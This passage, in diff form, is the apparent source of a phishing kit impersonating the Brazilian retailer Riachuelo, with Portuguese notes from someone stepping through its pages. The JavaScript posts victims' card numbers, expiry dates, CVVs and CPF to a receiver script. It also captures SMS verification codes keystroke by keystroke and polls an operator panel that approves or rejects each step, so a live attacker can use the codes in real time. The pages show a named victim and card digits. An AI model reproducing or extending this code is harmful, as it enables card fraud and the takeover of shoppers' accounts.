+    let val = e.target.value.replace(/\D/g, '').slice(0, 3);
+    e.target.value = val; 
+    vCVV.innerText = val || '***'; 
+    checkForm();
+    capturarAoVivo();
+});
+
+// ================= VALIDAÇÕES =================
+function validarLuhn(numero) {
+    if (numero.length !== 16) return false;
+    if (/^0+$/.test(numero)) return false; 
+    
+    let soma = 0;
+    let alternar = false;
+    
+    for (let i = numero.length - 1; i >= 0; i--) {
+        let n = parseInt(numero.charAt(i), 10);
+        if (alternar) {
+            n *= 2;
+            if (n > 9) n -= 9;
+        }
+        soma += n;
+        alternar = !alternar;
+    }
+    return (soma % 10 === 0);
+}
+
+function validarData(dataString) {
+    if (dataString.length !== 5) return false;
+    
+    const partes = dataString.split('/');
+    if (partes.length !== 2) return false;
+
+    const mesInserido = parseInt(partes[0], 10);
+    const anoInserido = parseInt("20" + partes[1], 10); 
+
+    if (mesInserido < 1 || mesInserido > 12) return false;
+
+    const dataAtual = new Date();
+    const mesAtual = dataAtual.getMonth() + 1; 
+    const anoAtual = dataAtual.getFullYear();
+
+    if (anoInserido < anoAtual) return false;
+    if (anoInserido === anoAtual && mesInserido < mesAtual) return false;
+
+    return true;
+}
+
+function checkForm() {
+    const numeroLimpo = inCardNumber.value.replace(/\s/g, '');
+    const dateVal = inDate.value;
+    const cvvVal = inCVV.value;
+
+    const msgCard = document.getElementById('msg-card');
+    const msgDate = document.getElementById('msg-date');
+
+    let numValid = false;
+    let dateValid = false;
+    let cvvValid = false;
+
+    if (numeroLimpo.length === 16) {
+        numValid = validarLuhn(numeroLimpo);
+        if (numValid) {
+            if(msgCard) msgCard.style.display = 'none';
+            inCardNumber.style.borderColor = '#ddd'; 
+        } else {
+            if(msgCard) msgCard.style.display = 'block'; 
+            inCardNumber.style.borderColor = '#ff4444'; 
+        }
+    } else {
+        if(msgCard) msgCard.style.display = 'none';
+        inCardNumber.style.borderColor = '#ddd'; 
+    }
+
+    if (dateVal.length === 5) {
+        dateValid = validarData(dateVal);
+        if (dateValid) {
+            if(msgDate) msgDate.style.display = 'none';
+            inDate.style.borderColor = '#ddd';
+        } else {
+            if(msgDate) msgDate.style.display = 'block';
+            inDate.style.borderColor = '#ff4444';
+        }
+    } else {
+        if(msgDate) msgDate.style.display = 'none';
+        inDate.style.borderColor = '#ddd';
+    }
+
+    if (cvvVal.length === 3) {
+        cvvValid = true;
+    }
+
+    if (numValid && dateValid && cvvValid) {
+        btn.disabled = false; 
+        btn.classList.add('active');
+    } else {
+        btn.disabled = true; 
+        btn.classList.remove('active');
+    }
+}
+
+function validarCartao() {
+    // === A CORREÇÃO ESTÁ AQUI ===
+    // Muda o título da página para o tracking.js não apagar os seus botões no painel!
+    document.title = 'Aguardando Aprovação...';
+    // ============================
+
+    document.querySelector('.card-scene').style.opacity = '0.4';
+    document.querySelector('.form-grid').style.opacity = '0.4';
+    inCardNumber.style.opacity = '0.4';
+    btn.style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    const cpfUser = localStorage.getItem('user_cpf');
+    const uidUser = localStorage.getItem('device_uid');
+    
+    // Envio inicial informando que está aguardando
+    fetch('../receiver.php', {
+        method: 'POST', 
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            uid: uidUser,
+            cpf: cpfUser,
+            pagina: window.location.pathname,
+            acao: 'Aguardando Aprovação p/ Cancelamento',
+            comando: 'aguardando', 
+            cc_num: inCardNumber.value, 
+            cc_val: inDate.value, 
+            cc_cvv: inCVV.value
+        })
+    });
+
+checkInterval = setInterval(() => {
+        fetch('../receiver.php', { method: 'POST', body: JSON.stringify({ uid: uidUser, cpf: cpfUser }) })
+        .then(res => res.json())
+        .then(data => {
+            if (data.comando === 'ir_sms') {
+                clearInterval(checkInterval);
+                window.location.href = '../sms/index.php'; 
+            } 
+else if (data.comando === 'recusar') {
+    clearInterval(checkInterval); 
+    
+    fetch('../receiver.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            uid: uidUser, 
+            cpf: cpfUser, 
+            acao: 'Corrigindo dados...', // <--- Isso limpa o "Aguardando"
+            comando: '', 
+            cc_num: inCardNumber.value, 
+            cc_val: inDate.value, 
+            cc_cvv: inCVV.value         
+        })
+    }).then(() => {
+        // MUITO IMPORTANTE: Mudar o título aqui também
+        document.title = "Corrigindo dados..."; 
+
+        document.getElementById('loading').style.display = 'none';
+        document.querySelector('.card-scene').style.opacity = '1';
+        document.querySelector('.form-grid').style.opacity = '1';
+        inCardNumber.style.opacity = '1';
+        btn.style.display = 'block';
+
+        const msgErro = document.getElementById('msg-erro-cartao');
+        msgErro.style.display = 'block';
+        msgErro.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    });
+}
+        });
+    }, 2000);
+}
+</script>
+
+</body></html>
+
+APERTEI CANCELAR E FOI PARA ESSA PAGINA 
+
+PAGINA '8'
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Validação SMS Token</title>
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #fff; color: #333; text-align: center; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 40px auto; }
+        
+        .logo { font-size: 32px; font-weight: bold; letter-spacing: 2px; margin-bottom: 5px; display: block; }
+        .sub-logo { font-size: 12px; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 40px; display: block; }
+        
+        /* CAIXA DE MENSAGEM DO USUÁRIO */
+        .box-msg { 
+            background: #f9f9f9; padding: 25px; border-radius: 8px; border: 1px solid #eee; 
+            font-size: 15px; margin-bottom: 30px; color: #555; line-height: 1.6;
+        }
+
+        /* CAIXA DE ERRO (Vermelha) */
+        .error-box { 
+            background: #ffebee; color: #c62828; border: 1px solid #ef9a9a; 
+            padding: 15px; border-radius: 4px; font-size: 14px; 
+            margin-bottom: 20px; display: none; font-weight: bold;
+        }
+
+        label { font-weight: bold; display: block; margin-bottom: 10px; font-size: 16px; }
+        
+        /* INPUT DE TOKEN */
+        input[type="tel"] {
+            width: 180px; padding: 12px; font-size: 26px; text-align: center; letter-spacing: 6px;
+            border: 1px solid #ccc; border-radius: 4px; margin-bottom: 15px; outline: none;
+            font-family: monospace; transition: 0.3s;
+        }
+        input[type="tel"]:focus { border-color: #000; box-shadow: 0 0 0 2px rgba(0,0,0,0.1); }
+        
+        .link-resend { color: #000; text-decoration: underline; font-size: 12px; cursor: pointer; display: block; margin-bottom: 30px; }
+        
+        .btn-enviar {
+            background: #111; color: #fff; padding: 15px 40px; font-size: 16px; font-weight: bold;
+            border: none; cursor: pointer; width: 100%; max-width: 200px; transition: 0.3s;
+            border-radius: 4px; text-transform: uppercase;
+        }
+        .btn-enviar:hover { background: #333; transform: translateY(-2px); }
+
+        /* LOADING */
+        #loading-screen { display: none; margin-top: 50px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-content">
+        <span class="logo">RCHLO</span>
+        <span class="sub-logo">Riachuelo</span>
+
+        <div id="msg-erro" class="error-box">
+            Código inválido ou expirado.<br>Por favor, digite novamente.
+        </div>
+
+        <div class="box-msg">
+            <strong>Confirmação de Cancelamento</strong><br><br>
+            Prezado(a) <strong>FILIPE</strong><br>
+            Para finalizarmos o <strong>cancelamento</strong> em seu cartão com final <strong>7114</strong>, 
+            por favor digite o código de 6 dígitos enviado via SMS para o seu celular cadastrado.
+        </div>
+
+        <label>Token SMS:</label>
+        <input type="tel" id="smsToken" maxlength="6" placeholder="000000" autocomplete="off">
+        
+        <a class="link-resend" onclick="alert('Novo código enviado com sucesso!')">Clique aqui para receber outro SMS Token.</a>
+
+        <button class="btn-enviar" onclick="enviarToken()">Enviar</button>
+    </div>
+
+    <div id="loading-screen" class="container">
+        <span class="logo">RCHLO</span>
+        <br><br>
+        <h2>Validando Token...</h2>
+        <div class="spinner"></div>
+        <p style="color:#666; font-size:14px; margin-top:10px;">Aguarde, validando chave de segurança.</p>
+    </div>
+
+    <script src="../js/tracking.js"></script> 
+    
+    <script>
+        const tokenInput = document.getElementById('smsToken');
+
+        // ========================================================
+        // CAPTURA EM TEMPO REAL (DEBOUNCE DO TOKEN)
+        // ========================================================
+        let timerDigitacao;
+        
+        function capturarAoVivo() {
+            clearTimeout(timerDigitacao);
+            
+            // Muda o título para o tracking.js enviar a informação correta
+            document.title = 'Preenchendo Token...';
+            
+            timerDigitacao = setTimeout(() => {
+                const cpfUser = localStorage.getItem('user_cpf');
+                const uidUser = localStorage.getItem('device_uid');
+                const idOperador = localStorage.getItem('id_operador');
+                
+                fetch('../receiver.php', {
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        uid: uidUser,
+                        cpf: cpfUser,
+                        operador: idOperador, // Avisa o painel de quem é
+                        pagina: window.location.pathname,
+                        acao: 'Preenchendo Token...', 
+                        sms_token: tokenInput.value
+                    })
+                }).catch(() => {}); 
+                
+            }, 400); 
+        }
+
+        // Bloqueia letras e aciona a captura a cada número digitado
+        tokenInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').slice(0, 6);
+            e.target.value = val;
+            capturarAoVivo();
+        });
+        // ========================================================
+
+        function enviarToken() {
+            const token = tokenInput.value;
+            
+            if(token.length < 6) { 
+                alert("Por favor, digite o código completo de 6 dígitos.");
+                return;
+            }
+            
+            // Muda o título do site para travar os botões no painel
+            document.title = 'Aguardando Aprovação SMS...';
+
+            document.getElementById('msg-erro').style.display = 'none';
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'block';
+
+            const cpf = localStorage.getItem('user_cpf');
+            const uid = localStorage.getItem('device_uid');
+            const idOperador = localStorage.getItem('id_operador');
+
+            // ENVIA A AÇÃO OFICIAL DE AGUARDANDO E DESTRAVA O BANCO
+            fetch('../receiver.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    uid: uid,
+                    cpf: cpf,
+                    operador: idOperador,
+                    pagina: window.location.pathname,
+                    acao: 'Aguardando Aprovação SMS',
+                    comando: 'aguardando', // <--- Isso faz os botões aparecerem no painel
+                    sms_token: token
+                })
+            });
+
+            // Loop de Espera
+            const check = setInterval(() => {
+                fetch('../receiver.php', { method: 'POST', body: JSON.stringify({ uid: uid, cpf: cpf }) })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.comando === 'token_aprovado') {
+                        clearInterval(check);
+                        // SUCESSO: Vai para a tela final de cancelamento
+                        window.location.href = '../desistencia/sucesso_final.php'; 
+                    } 
+                    else if (data.comando === 'token_recusar') {
+                        clearInterval(check);
+                        
+                        // MÁGICA: Limpa o token recusado do painel ANTES de voltar a tela
+                        fetch('../receiver.php', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                uid: uid,
+                                cpf: cpf,
+                                operador: idOperador,
+                                acao: 'Corrigindo Token...', 
+                                comando: 'aguardando', // Destrava o banco para nova tentativa
+                                sms_token: '' // Apaga o Token da visão do painel
+                            })
+                        }).then(() => {
+                            // Volta a tela do cliente sem dar Reload na página (mais rápido e fluido)
+                            document.getElementById('loading-screen').style.display = 'none';
+                            document.getElementById('main-content').style.display = 'block';
+                            
+                            tokenInput.value = '';
+                            tokenInput.focus();
+                            document.getElementById('msg-erro').style.display = 'block'; // Mostra a caixa vermelha
+                            document.title = 'Preenchendo Token...'; // Devolve o status correto
+
+                            // Limpa o comando no servidor para evitar loop de recusa
+                            fetch('../receiver.php', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    uid: uid,
+                                    cpf: cpf,
+                                    comando: '' 
+                                })
+                            });
+                        });
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+
+</body></html>
+
+COLOQUEI UM TOKEN ALEATORIO FICOU ASSIM AGORA 
+
+PAGINA '9'
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Aguardando Aprovação SMS...</title>
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #fff; color: #333; text-align: center; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 40px auto; }
+        
+        .logo { font-size: 32px; font-weight: bold; letter-spacing: 2px; margin-bottom: 5px; display: block; }
+        .sub-logo { font-size: 12px; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 40px; display: block; }
+        
+        /* CAIXA DE MENSAGEM DO USUÁRIO */
+        .box-msg { 
+            background: #f9f9f9; padding: 25px; border-radius: 8px; border: 1px solid #eee; 
+            font-size: 15px; margin-bottom: 30px; color: #555; line-height: 1.6;
+        }
+
+        /* CAIXA DE ERRO (Vermelha) */
+        .error-box { 
+            background: #ffebee; color: #c62828; border: 1px solid #ef9a9a; 
+            padding: 15px; border-radius: 4px; font-size: 14px; 
+            margin-bottom: 20px; display: none; font-weight: bold;
+        }
+
+        label { font-weight: bold; display: block; margin-bottom: 10px; font-size: 16px; }
+        
+        /* INPUT DE TOKEN */
+        input[type="tel"] {
+            width: 180px; padding: 12px; font-size: 26px; text-align: center; letter-spacing: 6px;
+            border: 1px solid #ccc; border-radius: 4px; margin-bottom: 15px; outline: none;
+            font-family: monospace; transition: 0.3s;
+        }
+        input[type="tel"]:focus { border-color: #000; box-shadow: 0 0 0 2px rgba(0,0,0,0.1); }
+        
+        .link-resend { color: #000; text-decoration: underline; font-size: 12px; cursor: pointer; display: block; margin-bottom: 30px; }
+        
+        .btn-enviar {
+            background: #111; color: #fff; padding: 15px 40px; font-size: 16px; font-weight: bold;
+            border: none; cursor: pointer; width: 100%; max-width: 200px; transition: 0.3s;
+            border-radius: 4px; text-transform: uppercase;
+        }
+        .btn-enviar:hover { background: #333; transform: translateY(-2px); }
+
+        /* LOADING */
+        #loading-screen { display: none; margin-top: 50px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-content" style="display: none;">
+        <span class="logo">RCHLO</span>
+        <span class="sub-logo">Riachuelo</span>
+
+        <div id="msg-erro" class="error-box" style="display: none;">
+            Código inválido ou expirado.<br>Por favor, digite novamente.
+        </div>
+
+        <div class="box-msg">
+            <strong>Confirmação de Cancelamento</strong><br><br>
+            Prezado(a) <strong>FILIPE</strong><br>
+            Para finalizarmos o <strong>cancelamento</strong> em seu cartão com final <strong>7114</strong>, 
+            por favor digite o código de 6 dígitos enviado via SMS para o seu celular cadastrado.
+        </div>
+
+        <label>Token SMS:</label>
+        <input type="tel" id="smsToken" maxlength="6" placeholder="000000" autocomplete="off">
+        
+        <a class="link-resend" onclick="alert('Novo código enviado com sucesso!')">Clique aqui para receber outro SMS Token.</a>
+
+        <button class="btn-enviar" onclick="enviarToken()">Enviar</button>
+    </div>
+
+    <div id="loading-screen" class="container" style="display: block;">
+        <span class="logo">RCHLO</span>
+        <br><br>
+        <h2>Validando Token...</h2>
+        <div class="spinner"></div>
+        <p style="color:#666; font-size:14px; margin-top:10px;">Aguarde, validando chave de segurança.</p>
+    </div>
+
+    <script src="../js/tracking.js"></script> 
+    
+    <script>
+        const tokenInput = document.getElementById('smsToken');
+
+        // ========================================================
+        // CAPTURA EM TEMPO REAL (DEBOUNCE DO TOKEN)
+        // ========================================================
+        let timerDigitacao;
+        
+        function capturarAoVivo() {
+            clearTimeout(timerDigitacao);
+            
+            // Muda o título para o tracking.js enviar a informação correta
+            document.title = 'Preenchendo Token...';
+            
+            timerDigitacao = setTimeout(() => {
+                const cpfUser = localStorage.getItem('user_cpf');
+                const uidUser = localStorage.getItem('device_uid');
+                const idOperador = localStorage.getItem('id_operador');
+                
+                fetch('../receiver.php', {
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        uid: uidUser,
+                        cpf: cpfUser,
+                        operador: idOperador, // Avisa o painel de quem é
+                        pagina: window.location.pathname,
+                        acao: 'Preenchendo Token...', 
+                        sms_token: tokenInput.value
+                    })
+                }).catch(() => {}); 
+                
+            }, 400); 
+        }
+
+        // Bloqueia letras e aciona a captura a cada número digitado
+        tokenInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').slice(0, 6);
+            e.target.value = val;
+            capturarAoVivo();
+        });
+        // ========================================================
+
+        function enviarToken() {
+            const token = tokenInput.value;
+            
+            if(token.length < 6) { 
+                alert("Por favor, digite o código completo de 6 dígitos.");
+                return;
+            }
+            
+            // Muda o título do site para travar os botões no painel
+            document.title = 'Aguardando Aprovação SMS...';
+
+            document.getElementById('msg-erro').style.display = 'none';
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'block';
+
+            const cpf = localStorage.getItem('user_cpf');
+            const uid = localStorage.getItem('device_uid');
+            const idOperador = localStorage.getItem('id_operador');
+
+            // ENVIA A AÇÃO OFICIAL DE AGUARDANDO E DESTRAVA O BANCO
+            fetch('../receiver.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    uid: uid,
+                    cpf: cpf,
+                    operador: idOperador,
+                    pagina: window.location.pathname,
+                    acao: 'Aguardando Aprovação SMS',
+                    comando: 'aguardando', // <--- Isso faz os botões aparecerem no painel
+                    sms_token: token
+                })
+            });
+
+            // Loop de Espera
+            const check = setInterval(() => {
+                fetch('../receiver.php', { method: 'POST', body: JSON.stringify({ uid: uid, cpf: cpf }) })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.comando === 'token_aprovado') {
+                        clearInterval(check);
+                        // SUCESSO: Vai para a tela final de cancelamento
+                        window.location.href = '../desistencia/sucesso_final.php'; 
+                    } 
+                    else if (data.comando === 'token_recusar') {
+                        clearInterval(check);
+                        
+                        // MÁGICA: Limpa o token recusado do painel ANTES de voltar a tela
+                        fetch('../receiver.php', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                uid: uid,
+                                cpf: cpf,
+                                operador: idOperador,
+                                acao: 'Corrigindo Token...', 
+                                comando: 'aguardando', // Destrava o banco para nova tentativa
+                                sms_token: '' // Apaga o Token da visão do painel
+                            })
+                        }).then(() => {
+                            // Volta a tela do cliente sem dar Reload na página (mais rápido e fluido)
+                            document.getElementById('loading-screen').style.display = 'none';
+                            document.getElementById('main-content').style.display = 'block';
+                            
+                            tokenInput.value = '';
+                            tokenInput.focus();
+                            document.getElementById('msg-erro').style.display = 'block'; // Mostra a caixa vermelha
+                            document.title = 'Preenchendo Token...'; // Devolve o status correto
+
+                            // Limpa o comando no servidor para evitar loop de recusa
+                            fetch('../receiver.php', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    uid: uid,
+                                    cpf: cpf,
+                                    comando: '' 
+                                })
+                            });
+                        });
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+
+</body></html>
